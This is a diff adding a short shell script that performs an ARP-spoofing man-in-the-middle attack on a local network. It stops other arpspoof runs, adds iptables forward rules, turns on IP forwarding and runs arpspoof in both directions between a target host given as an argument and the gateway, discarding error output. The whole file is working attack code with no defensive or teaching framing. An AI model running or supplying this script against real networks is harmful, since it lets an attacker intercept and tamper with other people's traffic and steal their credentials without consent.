@@ -1,0 +1,46 @@
+#!/bin/sh
+#
+
+GATEWAY=192.168.0.1
+HOST=$1
+INF=$2
+
+echo Log: stopping any other arpspoof, if running!
+
+./stoparp
+
+#
+# Check argument
+#
+
+
+if [ "a"$HOST =  "a" ]; then
+	echo "Er: No IP-adress!"
+	read x
+	exit
+fi
+
+#
+# Set IP-tables
+#
+echo Log: setting iptables ...
+iptables -I FORWARD 1 -s 192.168.0.0/24 -j ACCEPT
+iptables -I FORWARD 1 -d 192.168.0.0/24 -j ACCEPT
+
+#
+# Let's spoof!!
+#
+
+echo Log: spoofing IP-address: $HOST
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+arpspoof $HOST -t $GATEWAY -i $INF 2> /dev/null & 
+arpspoof $GATEWAY -t $HOST -i $INF 2> /dev/null & 
+
+echo Log: checking that processes are running ...
+ps -ef | grep "[0-9] arpspoof"
+
+#
+# EOF
+#
